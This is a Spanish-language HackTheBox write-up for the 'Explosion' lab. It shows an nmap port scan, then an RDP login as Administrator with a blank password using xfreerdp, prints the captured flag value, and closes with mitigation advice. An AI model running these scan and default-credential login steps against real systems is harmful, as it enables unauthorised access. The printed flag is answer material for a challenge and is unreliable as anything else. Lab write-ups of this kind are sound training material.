---
layout: post
title: HTB — Explosion
date: 2026-05-31
platform: HackTheBox
difficulty: very-easy
description: RDP con credenciales por defecto
tags:
  - RDP
  - Windows
---

## Introducción

Explosion introduce un servicio que cualquier persona que haya administrado servidores Windows conoce bien: RDP (Remote Desktop Protocol). Es el protocolo que permite controlar una máquina Windows de forma gráfica de manera remota, como si estuvieras sentado frente a ella.

En entornos mal configurados, RDP expuesto con credenciales por defecto es una de las vulnerabilidades más críticas que existe. No requiere exploits, no requiere técnicas avanzadas. Solo requiere que alguien haya olvidado poner una contraseña.

---

## Reconocimiento

Verificamos conectividad:

```bash
ping -c 1 10.129.x.x
# -c 1    Envía solo 1 paquete ICMP
```

Descubrimiento de puertos:

```bash
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 10.129.x.x -oG allports
# -p-          Escanea los 65535 puertos
# -sS          SYN scan (sigiloso, no completa el handshake TCP)
# --open       Muestra solo puertos abiertos
# --min-rate   Envía mínimo 5000 paquetes por segundo
# -vvv         Verbose: muestra resultados en tiempo real
# -n           Sin resolución DNS (más rápido)
# -Pn          Omite el host discovery (asume que el host está activo)
# -oG          Guarda el output en formato Grepable
```

Output relevante:

```
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
47001/tcp open  winrm
49664-49671/tcp open msrpc
```

Los puertos RPC dinámicos (49664+) son ruido de fondo de Windows. El protagonista es el **3389 — RDP**.

Escaneo de versiones y scripts sobre los puertos relevantes:

```bash
nmap -sCV -p135,139,445,3389,5985,47001 10.129.x.x -oN target
# -sC      Ejecuta scripts de detección por defecto (NSE)
# -sV      Detecta versión del servicio
# -p       Escanea solo los puertos especificados
# -oN      Guarda el output en formato Normal (legible)
```

Output relevante:

```
PORT     STATE SERVICE       VERSION
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: EXPLOSION
|   NetBIOS_Computer_Name: EXPLOSION
|   Product_Version: 10.0.17763
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0
445/tcp  open  microsoft-ds?
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
```

Nmap revela:
- **Hostname:** `EXPLOSION`
- **Versión OS:** `10.0.17763` → Windows Server 2019 / Windows 10 build 1809
- **Puerto 5985:** WinRM activo — segunda vía de entrada si conseguimos credenciales
- **SMB:** firma no requerida

---

## Explotación

Con RDP expuesto, pruebo credenciales por defecto. El usuario más privilegiado de Windows es `Administrator`:

```bash
xfreerdp /v:10.129.x.x /u:Administrator /cert:ignore
# /v            IP o hostname del objetivo
# /u            Usuario con el que intentamos conectarnos
# /cert:ignore  Ignora la advertencia del certificado autofirmado
```

Introduzco el usuario `Administrator` y dejo la contraseña en blanco. Enter.

```
[INFO] Connection established
```

Escritorio de Windows. Acceso completo como administrador del sistema.

---

## Flag

Abro `PowerShell` y localizo la flag:

```powershell
cd C:\Users\Administrator\Desktop
dir
type flag.txt
# 951fa96d7830c451b536be5a6be008a0
```

---

## ¿Qué aprendemos de esto?

**RDP no debería estar expuesto a internet.** Si se necesita acceso remoto, debería estar detrás de una VPN o limitado a IPs específicas mediante firewall. RDP expuesto públicamente es un blanco constante de bots que hacen fuerza bruta de forma automatizada.

**`Administrator` sin contraseña es un error crítico.** Windows permite crear la cuenta de administrador sin contraseña durante la instalación. Si nadie la configura antes de conectar la máquina a la red, cualquiera puede entrar.

**WinRM también estaba disponible.** El puerto 5985 daría una segunda vía de entrada con `evil-winrm` si tuviéramos credenciales. Siempre vale anotar todos los servicios de administración remota disponibles.

---

## Resumen técnico

| Elemento | Detalle |
|----------|---------|
| Puerto | 3389/tcp (RDP) |
| Vulnerabilidad | Credenciales por defecto (`Administrator` sin contraseña) |
| Acceso obtenido | Administrador con sesión gráfica completa |
| Herramientas | `nmap`, `xfreerdp` |
| Mitigación | Deshabilitar RDP si no es necesario, asignar contraseña robusta a Administrator, restringir acceso por IP, habilitar NLA (Network Level Authentication), usar VPN para acceso remoto |
